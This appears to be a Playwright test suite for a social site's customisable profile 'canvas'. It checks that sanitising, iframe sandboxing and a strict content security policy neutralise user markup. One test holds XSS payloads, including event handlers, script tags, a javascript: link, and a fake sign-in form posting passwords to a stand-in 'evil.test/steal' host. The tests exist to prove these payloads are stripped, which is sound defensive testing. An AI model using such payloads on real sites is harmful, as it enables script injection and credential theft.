import { test, expect } from "@playwright/test";
import { resetFixtures, signIn, signOut } from "./amici";

/**
 * The profile canvas: the MySpace bit, and the most dangerous feature in
 * Amici.
 *
 * The sanitiser has unit tests and a fuzz target in internal/security/canvas.
 * What those cannot show is that the rendered result is actually inert in a
 * real browser, inside a real frame, with the real headers. That is what this
 * file is for: it puts hostile markup through the editor a member uses and
 * then asks the browser what happened.
 */

test.beforeEach(async ({ request }) => {
  await resetFixtures(request);
});

async function saveCanvas(page: import("@playwright/test").Page, html: string, css = "") {
  await page.goto("/settings/canvas");
  await page.getByLabel("Your HTML").fill(html);
  await page.getByLabel("Your CSS").fill(css);
  await page.getByRole("button", { name: "Save my page" }).click();
  await expect(page).toHaveURL(/\/settings\/canvas$/);
}

test("the nostalgia survives", async ({ page }) => {
  await signIn(page, "rosa@example.test");
  await saveCanvas(
    page,
    `<center><marquee behavior="alternate"><font color="#c2185b" face="Comic Sans MS" size="5">welcome to my page</font></marquee></center>
     <table border="1" cellpadding="6"><tr><td><blink>my top four</blink></td></tr></table>`,
    `h1 { color: hotpink; text-shadow: 2px 2px 0 gold; }
     .glow { animation: pulse 1.4s ease-in-out infinite; }
     @keyframes pulse { from { opacity: 0.6; } to { opacity: 1; } }`,
  );

  const frame = page.frameLocator("iframe.amici-canvas-frame");
  await expect(frame.locator("marquee")).toBeVisible();
  await expect(frame.locator("font")).toHaveCount(1);
  await expect(frame.locator("table")).toBeVisible();
  await expect(frame.getByText("welcome to my page")).toBeVisible();

  // The animation made it through too, because @keyframes is the whole point
  // of letting people write CSS.
  const styles = await frame.locator("#amici-canvas").evaluate(() => {
    return document.querySelector("style")?.textContent ?? "";
  });
  expect(styles).toContain("@keyframes");
  expect(styles).toContain("hotpink");
});

test("script in a canvas never runs", async ({ page }) => {
  const errors: string[] = [];
  page.on("pageerror", (e) => errors.push(String(e)));
  const dialogs: string[] = [];
  page.on("dialog", async (d) => {
    dialogs.push(d.message());
    await d.dismiss();
  });

  await signIn(page, "rosa@example.test");
  await saveCanvas(
    page,
    `<div onclick="window.parent.document.body.remove()">click me</div>
     <script>window.parent.__escaped = true;</script>
     <img src="x" onerror="window.parent.__escaped = true">
     <svg><script>window.parent.__escaped = true;</script></svg>
     <iframe src="https://evil.test/"></iframe>
     <a href="javascript:alert(1)">a link</a>
     <form action="https://evil.test/steal" method="post">
       <input type="password" name="password">
       <button>Sign in to Amici</button>
     </form>`,
  );

  const frame = page.frameLocator("iframe.amici-canvas-frame");
  await expect(frame.getByText("click me")).toBeVisible();

  // Nothing that could run is left in the document at all. This is the
  // sanitiser's work; the sandbox and the policy are the layers underneath.
  await expect(frame.locator("script")).toHaveCount(0);
  await expect(frame.locator("iframe")).toHaveCount(0);
  await expect(frame.locator("form")).toHaveCount(0);
  await expect(frame.locator("input")).toHaveCount(0);
  await expect(frame.locator("[onclick]")).toHaveCount(0);
  await expect(frame.locator("[onerror]")).toHaveCount(0);
  await expect(frame.locator('a[href^="javascript:"]')).toHaveCount(0);

  // Click the element that carried the handler. If anything survived, this is
  // where it would fire.
  await frame.getByText("click me").click();

  // The parent page is untouched and nothing was reached from inside.
  await expect(page.locator("h1")).toBeVisible();
  const escaped = await page.evaluate(() => (window as never as { __escaped?: boolean }).__escaped);
  expect(escaped).toBeUndefined();
  expect(dialogs).toEqual([]);
  expect(errors).toEqual([]);
});

test("a member is told what was removed and why", async ({ page }) => {
  await signIn(page, "rosa@example.test");
  await page.goto("/settings/canvas");
  await page.getByLabel("Your HTML").fill(`<p>hello</p><script>alert(1)</script>`);
  await page
    .getByLabel("Your CSS")
    .fill(`p { color: red; background-image: url(https://evil.test/pixel.png); }`);
  await page.getByRole("button", { name: "Save my page" }).click();

  // A page that quietly loses half its markup is how you end up with people
  // convinced the site is broken, so every removal is explained.
  const notice = page.locator(".amici-flash--warn");
  await expect(notice).toBeVisible();
  await expect(notice).toContainText(/script/i);

  // And the source is kept exactly as typed, so nothing is lost.
  await expect(page.getByLabel("Your HTML")).toHaveValue(/<script>alert\(1\)<\/script>/);
});

test("the canvas frame is served with a policy that forbids everything", async ({ page }) => {
  await signIn(page, "rosa@example.test");
  const response = await page.goto("/u/rosa/canvas");
  expect(response?.status()).toBe(200);

  const csp = response!.headers()["content-security-policy"];
  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("script-src 'none'");
  expect(csp).toContain("connect-src 'none'");
  expect(csp).toContain("form-action 'none'");
  expect(csp).toContain("frame-ancestors 'self'");
  // No fonts, because a webfont is a request to somebody else's server.
  expect(csp).toContain("font-src 'none'");

  // And the frame is not cached anywhere on the way.
  expect(response!.headers()["cache-control"]).toContain("no-store");
});

test("the frame is sandboxed on the page that embeds it", async ({ page }) => {
  await signIn(page, "rosa@example.test");
  await page.goto("/u/rosa");

  const sandbox = await page.locator("iframe.amici-canvas-frame").getAttribute("sandbox");
  expect(sandbox).not.toBeNull();
  // Neither of these may ever appear here. allow-scripts would let a profile
  // run code; allow-same-origin would let it reach Amici's cookies. Together
  // they would be a complete account takeover from a profile page.
  expect(sandbox).not.toContain("allow-scripts");
  expect(sandbox).not.toContain("allow-same-origin");
});

test("images may only come from Amici", async ({ page }) => {
  await signIn(page, "rosa@example.test");
  await saveCanvas(
    page,
    `<img src="/static/stickers/lemon.svg" alt="ours">
     <img src="https://evil.test/tracker.gif" alt="theirs">`,
  );

  const frame = page.frameLocator("iframe.amici-canvas-frame");
  // An image hosted elsewhere would hand that host the address of everybody
  // who looks at the profile, including people who never agreed to it.
  await expect(frame.locator('img[src^="/static/"]')).toHaveCount(1);
  await expect(frame.locator('img[src^="http"]')).toHaveCount(0);

  // And ours actually renders. Surviving the sanitiser is not the same as
  // reaching the member: the frame is sandboxed to an opaque origin, so a
  // header meant to protect private resources can block Amici's own
  // decoration and leave nothing but alt text behind. naturalWidth is zero
  // for an image the browser refused to load.
  await expect
    .poll(async () =>
      frame.locator('img[src^="/static/"]').evaluate((img: HTMLImageElement) => img.naturalWidth),
    )
    .toBeGreaterThan(0);
});

test("links out are made safe", async ({ page }) => {
  await signIn(page, "rosa@example.test");
  await saveCanvas(page, `<a href="https://example.com/somewhere">my other website</a>`);

  const frame = page.frameLocator("iframe.amici-canvas-frame");
  const link = frame.locator('a[href="https://example.com/somewhere"]');
  await expect(link).toBeVisible();
  // The destination never learns whose profile sent the visitor.
  await expect(link).toHaveAttribute("rel", /noreferrer/);
  await expect(link).toHaveAttribute("rel", /noopener/);
  await expect(link).toHaveAttribute("target", "_blank");
});

test("a canvas cannot restyle Amici around it", async ({ page }) => {
  await signIn(page, "rosa@example.test");
  await saveCanvas(page, `<p>hello</p>`, `body { display: none; } .amici-header { display: none; }`);

  // The selectors are rewritten to sit beneath #amici-canvas, so the worst a
  // member can do is hide their own page.
  await page.goto("/u/rosa");
  await expect(page.locator(".amici-header")).toBeVisible();

  const frame = page.frameLocator("iframe.amici-canvas-frame");
  const styles = await frame.locator("#amici-canvas").evaluate(() => {
    return document.querySelector("style")?.textContent ?? "";
  });
  for (const line of styles.split("\n")) {
    const trimmed = line.trim();
    if (trimmed === "" || trimmed.startsWith("@") || trimmed.startsWith("}")) continue;
    if (!trimmed.includes("{")) continue;
    expect(trimmed.startsWith("#amici-canvas") || trimmed.startsWith("html,")).toBeTruthy();
  }
});

test("only friends can load the canvas frame", async ({ page }) => {
  await signIn(page, "rosa@example.test");
  await saveCanvas(page, `<center>my page</center>`);
  await signOut(page);

  await signIn(page, "teo@example.test");
  expect((await page.goto("/u/rosa/canvas"))?.status()).toBe(200);
  // Back to a real page before signing out. The frame is a bare document with
  // no header, because nothing of Amici's is allowed inside it.
  await page.goto("/feed");
  await signOut(page);

  await signIn(page, "bruno@example.test");
  expect((await page.goto("/u/rosa/canvas"))?.status()).toBe(404);
});

test("support can switch a page to plain without touching what it says", async ({ page }) => {
  await signIn(page, "rosa@example.test");
  await saveCanvas(page, `<center>a page somebody complained about</center>`);
  await signOut(page);

  await signIn(page, "support@example.test");
  await page.goto("/support");
  await page.getByLabel("Email address or handle").fill("rosa@example.test");
  await page.getByRole("button", { name: "Look up" }).click();
  await page
    .getByLabel("Why are you making their page plain?")
    .fill("reported for impersonation");
  await page.getByRole("button", { name: "Render their page plain" }).click();
  await expect(page.getByText(/now shows plain/)).toBeVisible();
  await signOut(page);

  // Teo sees a plain profile.
  await signIn(page, "teo@example.test");
  await page.goto("/u/rosa");
  await expect(page.locator("iframe.amici-canvas-frame")).toHaveCount(0);
  await signOut(page);

  // Rosa's markup is exactly as she left it, and she is told what happened
  // rather than left to work it out.
  await signIn(page, "rosa@example.test");
  await page.goto("/settings/canvas");
  await expect(page.getByText(/customisation is switched off/)).toBeVisible();
  await expect(page.getByLabel("Your HTML")).toHaveValue(/a page somebody complained about/);
});
